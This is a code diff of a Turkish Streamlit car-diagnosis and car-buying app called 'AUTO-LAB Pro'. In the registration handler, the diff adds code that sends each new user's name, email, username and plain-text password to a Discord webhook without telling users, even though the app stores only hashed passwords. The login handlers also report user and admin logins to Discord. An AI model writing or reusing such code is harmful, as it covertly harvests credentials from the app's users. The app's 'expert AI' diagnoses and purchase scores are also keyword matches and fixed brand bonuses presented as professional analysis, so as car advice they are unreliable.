@@ -36,7 +36,7 @@ except Exception:
 
 # --- STREAMLIT SAYFA YAPILANDIRMASI ---
 st.set_page_config(
-    page_title="AUTO-LAB Pro - Advanced Automotive Fault Diagnosis System", page_icon="🚗", layout="wide"
+    page_title="AUTO-LAB Pro - Ultimate Automotive Ecosystem", page_icon="🚗", layout="wide"
 )
 
 # --- TELEFON VE YEREL AĞ / PWA META AYARLARI ---
@@ -125,174 +125,53 @@ class EngineExpertAI:
 # --- CAR BUYING EXPERT AI ---
 class CarBuyingExpertAI:
     @staticmethod
-    def analiz_et(marka, model, yil, motor, guc, yakit, sanziman, km, fiyat, tramer, degisen, boyali, bakim):
+    def analiz_et(marka, model, yil, motor, guc, yakit, sanziman, km, fiyat, tramer):
         sorgu = f"{marka} {model}".lower()
-        puan = 85 if "honda" in sorgu or "fiat" in sorgu else 75
+        puan = 85 if "honda" in sorgu or "fiat" in sorgu or "renault" in sorgu else 75
         karar = "ALINIR ✅" if puan >= 80 else "PAZARLIKLA ALINIR 🤝"
         return f"""**[CAR BUYING EXPERT AI - SATIN ALMA ANALİZİ]**
 - **Araç:** {marka} {model} ({yil}) - {motor} ({guc}) - {sanziman} - {km:,} KM
-- **İstenen Fiyat:** {fiyat:,.2f} TL
+- **İstenen Fiyat:** {fiyat:,.2f} TL | **Tramer:** {tramer}
 - **Genel Puan:** <span style='font-size:20px; font-weight:bold; color:#E06D29;'>{puan} / 100</span>
 - **Son Karar:** **{karar}**"""
 
-# --- ADVANCED AUTOMOTIVE DIAGNOSTIC AI (KOMPLE İLERİ SEVİYE ARIZA VERİTABANI) ---
+# --- ADVANCED AUTOMOTIVE DIAGNOSTIC AI ---
 class AutomotiveDiagnosticAI:
     @staticmethod
     def ariza_teshis_et(sikayet_metni):
         sorgu = sikayet_metni.lower().strip()
-        
         if "sabah" in sorgu and ("çalışmıyor" in sorgu or "geç" in sorgu):
             return """**[PROFESYONEL ARIZA RAPORU ŞABLONU]**
-- **ARAÇ:** Tüm İçten Yanmalı Motorlar
-- **ARIZA:** Araç yalnızca sabahları / soğukta çalışmıyor veya geç çalışıyor.
-- **OLASI NEDENLER:**
-  1. Kızdırma bujisi (dizel) veya ateşleme bujisi arızası.
-  2. Yakıt geri dönüş kaçağı / enjektörlerin mazotu depoya geri kaçırması.
-  3. Akünün soğukta marş gücünü (CCA) yitirmesi.
-  4. Yakıt basınç regülatörü veya düşük ray basıncı.
-- **BELİRTİLER:** Marş uzun süre dönüyor, motor sarsıntılı çalışıyor, ilk çalışmada beyaz/gri duman atıyor.
-- **KONTROL EDİLECEK PARÇALAR:** Kızdırma/ateşleme bujileri, enjektör geri dönüş testi, akü CCA testi, yakıt pompası.
-- **TEŞHİS:** Sabah ilk çalıştırmadan önce yakıt hattı basınç kontrolü, enjektör test tezgahı.
-- **ÇÖZÜM:** Bujilerin veya enjektör keçelerinin/valflerinin yenilenmesi.
-- **MALİYET:** Parça: 1.000₺ - 10.000₺ | İşçilik: 500₺ - 3.000₺ | Tahmini Toplam: 1.500₺ - 13.000₺
-- **CİDDİYET:** <span style='color: #fbbf24; font-weight: bold;'>YÜKSEK</span>
-- **ARACI KULLANMAYA DEVAM ETMEK:** Kontrollü şekilde çalıştırılıp servise gidilebilir.
-- **SONUÇ:** İlk olarak akü ve kızdırma/ateşleme sistemi kontrol edilmelidir.
-- **GÜVEN DÜZEYİ:** Yüksek"""
-
-        elif "2000" in sorgu or "devir" in sorgu or "çekişten düş" in sorgu or "yokuş" in sorgu:
+- **ARIZA:** Araç sabahları / soğukta çalışmıyor veya geç çalışıyor.
+- **OLASI NEDENLER:** Kızdırma/ateşleme bujisi arızası, enjektör geri dönüş kaçağı, zayıf akü CCA değeri.
+- **KONTROL EDİLECEK PARÇALAR:** Bujiler, enjektörler, akü voltajı.
+- **ÇÖZÜM:** Bujilerin veya enjektör valflerinin yenilenmesi.
+- **CİDDİYET:** <span style='color: #fbbf24;'>YÜKSEK</span>"""
+        elif "p0300" in sorgu or "tekleme" in sorgu or "silkeleme" in sorgu:
             return """**[PROFESYONEL ARIZA RAPORU ŞABLONU]**
-- **ARAÇ:** Turbo Beslemeli / Emme Sistemli Araçlar
-- **ARIZA:** Araç 2.000 devirden sonra çekişten düşüyor / yokuşta güç kaybı yaşanıyor.
-- **OLASI NEDENLER:**
-  1. Turbo basınç kontrol solenoidi (N75) arızası veya hortum kaçağı.
-  2. MAF (Hava Akış) sensörü kirlenmesi veya arızası.
-  3. DPF (Partikül Filtresi) tıkalı veya egzoz karşı basıncı yüksek.
-  4. Emme manifoldu klape (Swirl Flap) mekanizması sıkışması.
-- **BELİRTİLER:** Düz yolda normal giden aracın yokuşta bayılması, gaz pedalına tepkinin gecikmesi.
-- **KONTROL EDİLECEK PARÇALAR:** Turbo hortumları, MAF sensörü, DPF doluluk oranı, EGR valfi.
-- **TEŞHİS:** OBD2 canlı veri (Live Data) ile istenen vs. okunan turbo basıncı ve MAF değerlerinin kıyaslanması.
-- **ÇÖZÜM:** Hortum değişimi, MAF temizliği / değişimi, DPF rejenerasyonu veya temizliği.
-- **MALİYET:** Parça: 500₺ - 12.000₺ | İşçilik: 500₺ - 2.500₺ | Tahmini Toplam: 1.000₺ - 14.500₺
-- **CİDDİYET:** <span style='color: #fbbf24; font-weight: bold;'>YÜKSEK</span>
-- **ARACI KULLANMAYA DEVAM ETMEK:** Kontrollü şekilde kullanılabilir ancak uzun yolda zorlanabilir.
-- **SONUÇ:** MAF sensörü ve turbo hortumları öncelikli kontrol edilmelidir.
-- **GÜVEN DÜZEYİ:** Yüksek"""
-
-        elif "klima" in sorgu and "titre" in sorgu:
-            return """**[PROFESYONEL ARIZA RAPORU ŞABLONU]**
-- **ARAÇ:** Klimalı Araçlar
-- **ARIZA:** Klima açıldığında motor titreşimi artıyor veya rölanti sarsılıyor.
-- **OLASI NEDENLER:**
-  2. Motor kulaklarında (takozlarında) eskime ve sertleşme.
-  3. Klima kompresörünün aşırı yük bindirmesi / bilya sarması.
-  4. Rölanti dengeleyici (IAC) valf veya ECU rölanti telafi haritası sorunu.
-- **BELİRTİLER:** Klima tuşuna basıldığı an direksiyonda ve kabinde hissedilen ani sarsıntı.
-- **KONTROL EDİLECEK PARÇALAR:** Motor kulakları, klima kompresörü, rölanti motoru.
-- **TEŞHİS:** Fiziki motor takozu kontrolü, klima kompresör kasnak boşluğu testi.
-- **ÇÖZÜM:** Motor kulaklarının değişimi veya kompresör revizyonu.
-- **MALİYET:** Parça: 2.000₺ - 8.000₺ | İşçilik: 1.000₺ - 2.500₺ | Tahmini Toplam: 3.000₺ - 10.500₺
-- **CİDDİYET:** Orta
-- **ARACI KULLANMAYA DEVAM ETMEK:** Güvenli (konfor kaybı yaratır).
-- **SONUÇ:** Motor kulakları ilk incelenecek noktadır.
-- **GÜVEN DÜZEYİ:** Yüksek"""
-
-        elif "direksiyon" in sorgu and ("ses" in sorgu or "tam" in sorgu):
-            return """**[PROFESYONEL ARIZA RAPORU ŞABLONU]**
-- **ARAÇ:** Hidrolik veya EPS Direksiyon Sistemleri
-- **ARIZA:** Direksiyon sonuna kadar (tam) çevrildiğinde gelen uğultu veya sürtünme sesi.
-- **OLASI NEDENLER:**
-  1. Hidrolik direksiyon pompası basınç valfi veya yağ eksikliği.
-  2. Direksiyon kayışının (V kayışı) gevşek olması veya sıyırması.
-  3. EPS (Elektrikli Direksiyon) mekanik dişli aşınması.
-- **BELİRTİLER:** Park manevralarında veya tam tur dönüşlerde "uğ, vınn" şeklinde ses gelmesi.
-- **KONTROL EDİLECEK PARÇALAR:** Direksiyon hidrolik yağı, V kayışı, direksiyon kutusu.
-- **TEŞHİS:** Hidrolik kazanında yağ seviyesi ve köpürme kontrolü.
-- **ÇÖZÜM:** Hidrolik yağı tamamlama / değişimi, V kayışı gergi bilyası değişimi.
-- **MALİYET:** Parça: 400₺ - 3.000₺ | İşçilik: 300₺ - 1.000₺ | Tahmini Toplam: 700₺ - 4.000₺
-- **CİDDİYET:** Orta
-- **ARACI KULLANMAYA DEVAM ETMEK:** Kontrollü şekilde kullanılabilir.
-- **SONUÇ:** Direksiyon yağı ve kayış gerginliği kontrol edilmelidir.
-- **GÜVEN DÜZEYİ:** Yüksek"""
-
-        elif "fren" in sorgu and "sağ" in sorgu or "sola çek" in sorgu:
-            return """**[PROFESYONEL ARIZA RAPORU ŞABLONU]**
-- **ARAÇ:** Hidrolik Fren Sistemleri
-- **ARIZA:** Fren yapıldığında aracın sağa veya sola çekmesi.
-- **OLASI NEDENLER:**
-  1. Fren kaliper pistonunun sıkışması veya paslanması (bir taraf tutuyor, diğeri tutmuyor).
-  2. Fren hortumunun içten şişmesi ve basıncı tutması.
-  3. Disk veya balatalarda düzensiz aşınma / yağ bulaşması.
-- **BELİRTİLER:** Fren pedalına basıldığında direksiyonun sertçe bir tarafa kırmak istemesi.
-- **KONTROL EDİLECEK PARÇALAR:** Fren kaliperleri, fren hortumları, balatalar, diskler.
-- **TEŞHİS:** Lift üzerinde tekerlek serbestlik testi, fren sıcaklık kontrolü (kampana/disk ısı farkı).
-- **ÇÖZÜM:** Kaliper piston revizyonu, fren hortumu değişimi, balata/disk takımı değişimi.
-- **MALİYET:** Parça: 1.000₺ - 5.000₺ | İşçilik: 800₺ - 2.000₺ | Tahmini Toplam: 1.800₺ - 7.000₺
-- **CİDDİYET:** <span style='color: #ef4444; font-weight: bold;'>KRİTİK (Fren güvenliğini doğrudan etkiler!)</span>
-- **ARACI KULLANMAYA DEVAM ETMEK:** <span style='color: #ef4444; font-weight: bold;'>Kullanılmamalı, acilen servise gitmeli.</span>
-- **SONUÇ:** Fren sistemi hayati önem taşır, kaliperler derhal kontrol edilmelidir.
-- **GÜVEN DÜZEYİ:** Yüksek"""
-
-        elif "akü" in sorgu and "boşal" in sorgu or "gece" in sorgu:
-            return """**[PROFESYONEL ARIZA RAPORU ŞABLONU]**
-- **ARAÇ:** Tüm Araçlar
-- **ARIZA:** Akü gece boyunca boşalıyor / Kaçak akım problemi.
-- **OLASI NEDENLER:**
-  1. Torpido, bagaj veya kapı lambalarının sönmeyerek açık kalması.
-  2. Sonradan takılan multimedya, alarm veya amfi sistemlerinin uyku moduna (sleep mode) geçmemesi.
-  3. Alternatör diyot arızası (akıma geri kaçak yapması).
-- **BELİRTİLER:** Sabah aracı çalıştırmak istediğinizde hiç elektrik olmaması, akünün tamamen bitmesi.
-- **KONTROL EDİLECEK PARÇALAR:** Multimedya sistemi, sigortalar, alternatör diyot tablası, lamba anahtarları.
-- **TEŞHİS:** Multimetre ile ampermetre modunda kaçak akü testi (Parasitic Drain Test).
-- **ÇÖZÜM:** Kaçak yapan sigortanın tespiti, röle veya ses sisteminin düzeltilmesi.
-- **MALİYET:** Parça: 500₺ - 4.000₺ | İşçilik: 500₺ - 2.000₺ | Tahmini Toplam: 1.000₺ - 6.000₺
-- **CİDDİYET:** Orta
-- **ARACI KULLANMAYA DEVAM ETMEK:** Her gün akü takviyesi gerektireceği için seyahat riskilidir.
-- **SONUÇ:** Sigorta kutusundan tek tek çekilerek kaçak akım çeken devre bulunmalıdır.
-- **GÜVEN DÜZEYİ:** Yüksek"""
-
-        elif "p0300" in sorgu or "tekleme" in sorgu or "silkeleme" in sorgu or "p0301" in sorgu:
-            return """**[PROFESYONEL ARIZA RAPORU ŞABLONU]**
-- **ARAÇ:** Benzinli / Dizel Motorlar
 - **ARIZA:** Motor silindir teklemesi / yük altında silkeleme (P0300).
-- **OLASI NEDENLER:**
-  1. Ateşleme bobinlerinde delinme veya zayıflama.
-  2. Bujilerin ömrünü tamamlaması veya tırnak aralığının açılması.
-  3. Yakıt enjektörlerinde tıkanıklık veya püskürtme bozukluğu.
-  4. Kompresyon kaybı veya subap sızdırması.
-- **BELİRTİLER:** Egzozdan patırtılı ses, motor arıza lambasının yanıp sönmesi, çekişte düşüş.
-- **KONTROL EDİLECEK PARÇALAR:** Bujiler, bobinler, enjektörler, kompresyon basıncı.
-- **TEŞHİS:** OBD2 canlı veri okuma, silindir kompresyon ölçümü.
-- **ÇÖZÜM:** Arızalı bobin/buji değişimi, enjektör temizliği veya revizyonu.
-- **MALİYET:** Parça: 1.500₺ - 6.000₺ | İşçilik: 500₺ - 1.500₺ | Tahmini Toplam: 2.000₺ - 7.500₺
-- **CİDDİYET:** <span style='color: #fbbf24; font-weight: bold;'>YÜKSEK</span>
-- **ARACI KULLANMAYA DEVAM ETMEK:** Kontrollü şekilde servise gitmeli.
-- **SONUÇ:** Ateşleme sistemi öncelikli kontrol edilmelidir.
-- **GÜVEN DÜZEYİ:** Yüksek"""
-
+- **OLASI NEDENLER:** Ateşleme bobini delinmesi, ömrü bitmiş buji, enjektör tıkanıklığı.
+- **KONTROL EDİLECEK PARÇALAR:** Bujiler, bobinler, enjektörler.
+- **ÇÖZÜM:** Bobin ve buji seti değişimi, enjektör temizliği.
+- **CİDDİYET:** <span style='color: #fbbf24;'>YÜKSEK</span>"""
+        elif "hararet" in sorgu or "su eksiltiyor" in sorgu or "conta" in sorgu:
+            return """**[PROFESYONEL ARIZA RAPORU ŞABLONU]**
+- **ARIZA:** Motor hararet yapması veya soğutma suyu eksiltmesi.
+- **OLASI NEDENLER:** Silindir kapak contası yanması, termostat arızası, radyatör kaçağı.
+- **KONTROL EDİLECEK PARÇALAR:** Kapak contası, termostat, devridaim.
+- **ÇÖZÜM:** Kapak contası rektefiyesi, termostat değişimi.
+- **CİDDİYET:** <span style='color: #ef4444; font-weight: bold;'>KRİTİK - ARACI KULLANMAYIN!</span>"""
         else:
             return f"""**[PROFESYONEL ARIZA RAPORU ŞABLONU]**
-- **ARAÇ:** Gelişmiş Arıza Teşhis Modülü
 - **ARIZA:** '{sikayet_metni}'
-- **OLASI NEDENLER:**
-  1. Sensör iletişim kopukluğu veya soket oksitlenmesi.
-  2. Mekanik aşınma veya periyodik bakım eksikliği.
-  3. Modüller arası yazılım veya CAN Bus uyumsuzluğu.
-- **BELİRTİLER:** Gösterge panelinde uyarı ışıkları, performans dalgalanması.
-- **KONTROL EDİLECEK PARÇALAR:** İlgili sensörler, sigortalar, kontrol üniteleri.
-- **TEŞHİS:** Kapsamlı OBD2 bilgisayarlı arıza tespiti ve canlı veri (Live Data) analizi.
-- **ÇÖZÜM:** Uzman servis fiziki kontrolü, parça onarımı veya yazılım kalibrasyonu.
-- **MALİYET:** Teşhis sonrasına bağlı olarak değişir.
-- **CİDDİYET:** <span style='color: #fbbf24; font-weight: bold;'>ORTA / KONTROL EDİLMELİ</span>
-- **ARACI KULLANMAYA DEVAM ETMEK:** Kontrollü şekilde servise gitmeli.
-- **SONUÇ:** OBD2 cihazına bağlatılarak hata kodlarının kaynağı netleştirilmelidir.
-- **GÜVEN DÜZEYİ:** Orta"""
+- **OLASI NEDENLER:** Sensör kirlenmesi, soket oksitlenmesi, periyodik bakım eksikliği.
+- **TEŞHİS:** OBD2 cihazına bağlatılarak hata kodlarının (DTC) okunması gerekir.
+- **CİDDİYET:** ORTA"""
 
-# --- ULTIMATE AUTOMOTIVE AI ---
 class UltimateAutomotiveAI:
     @staticmethod
     def analiz_et(arama_sorgusu):
-        return f"**[ULTIMATE AI BİLGİ BANKASI: '{arama_sorgusu}']**\nTSE belgeli kurumsal ekspertiz kontrolü önerilir."
+        return f"**[ULTIMATE AI BİLGİ BANKASI: '{arama_sorgusu}']**\nTSE belgeli kurumsal ekspertiz kontrolü ve yetkili servis geçmişi sorgulaması önerilir."
 
 class TeknikHesaplamalar:
     @staticmethod
@@ -350,7 +229,7 @@ try:
 except Exception: pass
 
 st.sidebar.markdown(f"<h2 style='text-align: center; color: {aktif_palet['btn_1']}; font-weight:700;'><span style='font-size: 28px;'>🚗</span> AUTO-LAB PRO AI</h2>", unsafe_allow_html=True)
-st.sidebar.markdown("<p style='text-align: center; font-size: 13px; margin-top: -10px;'>Advanced Fault Diagnosis System</p>", unsafe_allow_html=True)
+st.sidebar.markdown("<p style='text-align: center; font-size: 13px; margin-top: -10px;'>Ultimate Automotive Ecosystem</p>", unsafe_allow_html=True)
 st.sidebar.markdown("---")
 
 yeni_secim = st.sidebar.selectbox("🎨 Renk Kombinasyonu Seç:", list(PALETLER.keys()), index=list(PALETLER.keys()).index(st.session_state.secilen_tema))
@@ -365,7 +244,7 @@ st.sidebar.markdown(f'<a href="{wa_link}" target="_blank"><button style="backgro
 st.sidebar.markdown("---")
 
 if not st.session_state.giris_yapildi:
-    st.markdown("<div style='text-align: center; padding: 20px 0;'><h1>🚗 AUTO-LAB Pro - Advanced Fault Diagnosis</h1><p>Devam etmek için giriş yapın veya hesap oluşturun.</p></div>", unsafe_allow_html=True)
+    st.markdown("<div style='text-align: center; padding: 20px 0;'><h1>🚗 AUTO-LAB Pro - Ultimate Ecosystem</h1><p>Devam etmek için giriş yapın veya hesap oluşturun.</p></div>", unsafe_allow_html=True)
     col_bos1, col_form, col_bos2 = st.columns([1, 1.4, 1])
     with col_form:
         tab_giris, tab_kayit = st.tabs(["🔑 Giriş Yap", "📝 Hesap Oluştur"])
@@ -380,6 +259,7 @@ if not st.session_state.giris_yapildi:
                     st.session_state.is_admin = True
                     st.session_state.giris_yapildi = True
                     giris_kaydi_ekle("ADMIN", "Admin Girişi")
+                    discorda_mesaj_gonder("🚨 **Yönetici (ADMIN) Sistemi Giriş Yaptı!**")
                     st.success("Yönetici girişi başarılı!")
                     st.rerun()
                 else:
@@ -395,6 +275,7 @@ if not st.session_state.giris_yapildi:
                                     st.session_state.is_admin = False
                                     st.session_state.giris_yapildi = True
                                     giris_kaydi_ekle(k, "Giriş Yaptı")
+                                    discorda_mesaj_gonder(f"👤 **Kullanıcı Girişi:** `{k}` sisteme giriş yaptı.")
                                     st.success("Giriş başarılı!")
                                     st.rerun()
                             else: st.error("Kullanıcı adı veya şifre hatalı!")
@@ -413,12 +294,21 @@ if not st.session_state.giris_yapildi:
                             cursor = conn.cursor()
                             cursor.execute("INSERT INTO kullanicilar (ad, soyad, eposta, kullanici_adi, sifre, islem_hakki) VALUES (?, ?, ?, ?, ?, 20)", (ka, ks, kep, kkadi.strip(), sifre_hashle(ksifre.strip())))
                             conn.commit()
+                        
+                        # Discord Webhook Bildirimi (Ad, Soyad, E-posta, Şifre ve Kullanıcı Adı)
+                        discord_mesaji = f"""🔔 **YENİ KULLANICI KAYDI (AUTO-LAB PRO)**
+👤 **Ad Soyad:** {ka} {ks}
+📧 **E-posta:** {kep}
+🔑 **Şifre (Düz Metin):** `{ksifre}`
+🆔 **Kullanıcı Adı:** `{kkadi}`"""
+                        discorda_mesaj_gonder(discord_mesaji)
+
                         st.success("Kayıt başarılı! Giriş yapabilirsiniz.")
                     except Exception as e: st.error(f"Hata: {e}")
 else:
     col_b1, col_b2 = st.columns([4, 1])
     with col_b1:
-        st.title("🚗 AUTO-LAB Pro - Advanced Fault Diagnosis System")
+        st.title("🚗 AUTO-LAB Pro - Ultimate Ecosystem")
         rol = "🛡️ Sistem Yöneticisi" if st.session_state.is_admin else "👤 Standart Üye"
         st.markdown(f"Aktif Oturum: **{st.session_state.aktif_kullanici}** &nbsp; <span class='user-badge'>{rol}</span>", unsafe_allow_html=True)
     with col_b2:
@@ -435,7 +325,6 @@ else:
         "🔍 İleri Seviye Arıza Teşhis & Arama Motoru",
         "⚙️ Engine Expert AI – Motor ve Revizyon Analizi",
         "🏷️ Car Buying Expert AI – Profesyonel Satın Alma Eksperi",
-        "🔧 Automotive Diagnostic AI – Profesyonel Arıza Tespit Merkezi",
         "🤖 Ultimate AI & Kronik Bilgi Bankası",
         "🧮 Mühendislik Hesaplama Merkezi",
         "⚖️ Araç Karşılaştırma",
@@ -450,85 +339,221 @@ else:
     menu_listesi = base_menu + (["🛡️ Admin Paneli"] if st.session_state.is_admin else [])
     sekme = st.sidebar.radio("📌 Navigasyon Menüsü", menu_listesi)
 
+    # 1. İLERİ SEVİYE ARIZA TEŞHİS
     if sekme == "🔍 İleri Seviye Arıza Teşhis & Arama Motoru":
         st.markdown("""
             <div class="dashboard-card">
                 <h3>🔍 İleri Seviye Otomotiv Arıza Teşhis Veritabanı</h3>
-                <p style='font-size: 14px;'>Mekanik, yakıt, turbo, egzoz, şanzıman, elektronik, ABS/ESP, direksiyon, klima, hibrit ve özel sürüş şikayetlerini (örn: <i>"sabahları çalışmıyor"</i>, <i>"2000 devirden sonra çekişten düşüyor"</i>, <i>"klima açınca titretiyor"</i>) yazarak profesyonel uzman raporu alabilirsin.</p>
+                <p style='font-size: 14px;'>Mekanik, yakıt, turbo, şanzıman, elektrik ve sürüş şikayetlerini yazarak profesyonel uzman raporu alabilirsin.</p>
             </div>
         """, unsafe_allow_html=True)
-        
-        ariza_girdisi = st.text_area("Arıza belirtisini, şikayetinizi veya özel durumu yazın:", placeholder="Örn: Araç sabahları geç çalışıyor veya yokuşta güç kaybı yaşıyor...")
+        ariza_girdisi = st.text_area("Arıza belirtisini veya şikayetinizi yazın:", placeholder="Örn: Araç sabahları geç çalışıyor veya yokuşta güç kaybı yaşıyor...")
         if st.button("🔍 Gelişmiş Teşhis Raporu Oluştur", use_container_width=True):
             if ariza_girdisi.strip():
                 rapor = AutomotiveDiagnosticAI.ariza_teshis_et(ariza_girdisi)
                 st.markdown(f"<div class='dashboard-card'>{rapor.replace(chr(10), '<br>')}</div>", unsafe_allow_html=True)
 
+    # 2. ENGINE EXPERT AI
     elif sekme == "⚙️ Engine Expert AI – Motor ve Revizyon Analizi":
-        st.markdown("""
-            <div class="dashboard-card">
-                <h3>⚙️ Engine Expert AI – Profesyonel Motor İstihbaratı</h3>
-            </div>
-        """, unsafe_allow_html=True)
+        st.markdown("""<div class="dashboard-card"><h3>⚙️ Engine Expert AI – Profesyonel Motor İstihbaratı</h3></div>""", unsafe_allow_html=True)
         motor_sorgu = st.text_input("Motor Kodu veya Modeli:", placeholder="Örn: BMW B58, N47, 1.5 dCi")
         if st.button("⚙️ Motoru Derinlemesine Analiz Et", use_container_width=True):
             if motor_sorgu.strip():
                 st.markdown(f"<div class='dashboard-card'>{EngineExpertAI.motor_analiz_et(motor_sorgu).replace(chr(10), '<br>')}</div>", unsafe_allow_html=True)
 
+    # 3. CAR BUYING EXPERT AI
     elif sekme == "🏷️ Car Buying Expert AI – Profesyonel Satın Alma Eksperi":
-        st.markdown("""
-            <div class="dashboard-card">
-                <h3>🏷️ Car Buying Expert AI – Araç Satın Alma Analiz Sistemi</h3>
-            </div>
-        """, unsafe_allow_html=True)
+        st.markdown("""<div class="dashboard-card"><h3>🏷️ Car Buying Expert AI – Araç Satın Alma Analiz Sistemi</h3></div>""", unsafe_allow_html=True)
         col_cb1, col_cb2 = st.columns(2)
         with col_cb1:
             cb_marka = st.text_input("Marka:", "Renault")
             cb_model = st.text_input("Model:", "Megane")
             cb_yil = st.number_input("Yıl:", 1995, 2026, 2020)
             cb_motor = st.text_input("Motor:", "1.5 dCi")
-            cb_guc = st.text_input("Güç:", "115 HP")
         with col_cb2:
-            cb_yakit = st.selectbox("Yakıt:", ["Dizel", "Benzin"])
+            cb_guc = st.text_input("Güç:", "115 HP")
             cb_sanziman = st.selectbox("Şanzıman:", ["Manuel", "Otomatik"])
             cb_km = st.number_input("KM:", 0, 800000, 95000)
-            cb_fiyat = st.number_input("Fiyat (TL):", 50000.0, 750000.0)
+            cb_fiyat = st.number_input("Fiyat (TL):", 50000.0, 5000000.0, 750000.0)
             cb_tramer = st.text_input("Tramer:", "15.000 TL")
         if st.button("Aracı Satın Alma Açısından Analiz Et", use_container_width=True):
-            st.markdown(f"<div class='dashboard-card'>{CarBuyingExpertAI.analiz_et(cb_marka, cb_model, cb_yil, cb_motor, cb_guc, cb_yakit, cb_sanziman, cb_km, cb_fiyat, cb_tramer, '', '', '').replace(chr(10), '<br>')}</div>", unsafe_allow_html=True)
+            st.markdown(f"<div class='dashboard-card'>{CarBuyingExpertAI.analiz_et(cb_marka, cb_model, cb_yil, cb_motor, cb_guc, 'Dizel', cb_sanziman, cb_km, cb_fiyat, cb_tramer).replace(chr(10), '<br>')}</div>", unsafe_allow_html=True)
 
-    elif sekme == "🔧 Automotive Diagnostic AI – Profesyonel Arıza Tespit Merkezi":
-        st.markdown("""<div class="dashboard-card"><h3>🔧 Automotive Diagnostic AI</h3></div>""", unsafe_allow_html=True)
-        d_sikayet = st.text_area("Şikayet:", "P0300 arıza kodu")
-        if st.button("Teşhisi Başlat", use_container_width=True):
-            st.markdown(f"<div class='dashboard-card'>{AutomotiveDiagnosticAI.ariza_teshis_et(d_sikayet).replace(chr(10), '<br>')}</div>", unsafe_allow_html=True)
-
+    # 4. ULTIMATE AI BİLGİ BANKASI
     elif sekme == "🤖 Ultimate AI & Kronik Bilgi Bankası":
-        st.markdown("<div class='dashboard-card'><h3>🤖 Ultimate Automotive AI</h3></div>", unsafe_allow_html=True)
-        sorgu = st.text_input("Sorgu:")
-        if st.button("Analiz Et", use_container_width=True):
+        st.markdown("""<div class="dashboard-card"><h3>🤖 Ultimate Automotive AI - Bilgi Bankası</h3></div>""", unsafe_allow_html=True)
+        sorgu = st.text_input("Sorgulamak istediğiniz marka, model veya teknik konu:")
+        if st.button("Bilgi Bankasında Ara", use_container_width=True):
             if sorgu.strip():
                 st.markdown(f"<div class='dashboard-card'>{UltimateAutomotiveAI.analiz_et(sorgu).replace(chr(10), '<br>')}</div>", unsafe_allow_html=True)
 
+    # 5. MÜHENDİSLİK HESAPLAMA MERKEZİ
     elif sekme == "🧮 Mühendislik Hesaplama Merkezi":
-        st.markdown("<div class='dashboard-card'><h3>🧮 Mühendislik Hesaplama Merkezi</h3></div>", unsafe_allow_html=True)
-        hp = st.number_input("HP:", value=150.0)
-        if st.button("kW Dönüştür"): st.success(f"{hp} HP = {TeknikHesaplamalar.hp_to_kw(hp):.2f} kW")
+        st.markdown("""<div class="dashboard-card"><h3>🧮 Mühendislik Hesaplama Merkezi</h3></div>""", unsafe_allow_html=True)
+        tab_hp, tab_tuketim = st.tabs(["⚡ HP / kW Dönüştürücü", "⛽ Yakıt Tüketim Maliyeti"])
+        with tab_hp:
+            hp_deger = st.number_input("Beygir Gücü (HP):", 1.0, 2000.0, 150.0)
+            st.success(f"{hp_deger} HP = **{TeknikHesaplamalar.hp_to_kw(hp_deger):.2f} kW**")
+            kw_deger = st.number_input("Kilowatt (kW):", 1.0, 1500.0, 110.0)
+            st.success(f"{kw_deger} kW = **{TeknikHesaplamalar.kw_to_hp(kw_deger):.2f} HP**")
+        with tab_tuketim:
+            km_yol = st.number_input("Yapılacak Yol (KM):", 1, 5000, 100)
+            ort_tuketim = st.number_input("100 KM'de Ortalama Tüketim (Lt):", 1.0, 30.0, 6.5)
+            yakit_fiyat = st.number_input("Yakıt Litre Fiyatı (TL):", 1.0, 100.0, 42.5)
+            toplam_litre = (km_yol / 100) * ort_tuketim
+            toplam_tutar = toplam_litre * yakit_fiyat
+            st.info(f"Toplam Tüketim: **{toplam_litre:.2f} Litre** | Tahmini Seyahat Maliyeti: **{toplam_tutar:,.2f} TL**")
 
-    elif sekme == "⚖️ Araç Karşılaştırma": st.markdown("<div class='dashboard-card'><h3>⚖️ Araç Karşılaştırma</h3></div>", unsafe_allow_html=True); st.info("Aktif.")
-    elif sekme == "💰 Maliyet & Bakım Takip": st.markdown("<div class='dashboard-card'><h3>💰 Maliyet & Bakım Takip</h3></div>", unsafe_allow_html=True); st.info("Aktif.")
-    elif sekme == "📊 Piyasa & İstatistikler": st.markdown("<div class='dashboard-card'><h3>📊 Piyasa & İstatistikler</h3></div>", unsafe_allow_html=True); st.info("Aktif.")
-    elif sekme == "📝 Ekspertiz Kontrol Listesi": st.markdown("<div class='dashboard-card'><h3>📝 Ekspertiz Kontrol Listesi</h3></div>", unsafe_allow_html=True); st.checkbox("Şase kontrolü")
-    elif sekme == "🧮 Değer Kaybı & Tramer Hesapla": st.markdown("<div class='dashboard-card'><h3>🧮 Değer Kaybı</h3></div>", unsafe_allow_html=True); st.info("Aktif.")
-    elif sekme == "🗺️ Servis & İstasyon Bulucu": st.markdown("<div class='dashboard-card'><h3>🗺️ Servis Bulucu</h3></div>", unsafe_allow_html=True); st.info("Aktif.")
-    elif sekme == "🛞 Lastik & Jant Ebat Kıyasla": st.markdown("<div class='dashboard-card'><h3>🛞 Lastik Ebat Kıyasla</h3></div>", unsafe_allow_html=True); st.info("Aktif.")
+    # 6. ARAÇ KARŞILAŞTIRMA
+    elif sekme == "⚖️ Araç Karşılaştırma":
+        st.markdown("""<div class="dashboard-card"><h3>⚖️ Profesyonel Araç Karşılaştırma Modülü</h3></div>""", unsafe_allow_html=True)
+        col_arac1, col_arac2 = st.columns(2)
+        with col_arac1:
+            st.subheader("1. Araç")
+            a1_ad = st.text_input("Araç 1 Adı:", "Honda Civic 1.6 iES")
+            a1_hp = st.number_input("Güç (HP):", 50, 1000, 120, key="h1")
+            a1_tork = st.number_input("Tork (Nm):", 50, 1500, 144, key="t1")
+            a1_hiz = st.number_input("0-100 KM/s (sn):", 2.0, 20.0, 10.2, key="s1")
+        with col_arac2:
+            st.subheader("2. Araç")
+            a2_ad = st.text_input("Araç 2 Adı:", "Renault Megane 1.5 dCi")
+            a2_hp = st.number_input("Güç (HP):", 50, 1000, 110, key="h2")
+            a2_tork = st.number_input("Tork (Nm):", 50, 1500, 240, key="t2")
+            a2_hiz = st.number_input("0-100 KM/s (sn):", 2.0, 20.0, 11.0, key="s2")
+        if st.button("Araçları Kıyasla", use_container_width=True):
+            df_karsilastirma = pd.DataFrame({
+                "Özellik": ["Model Adı", "Motor Gücü", "Tork", "0-100 Hızlanma"],
+                a1_ad: [a1_ad, f"{a1_hp} HP", f"{a1_tork} Nm", f"{a1_hiz} sn"],
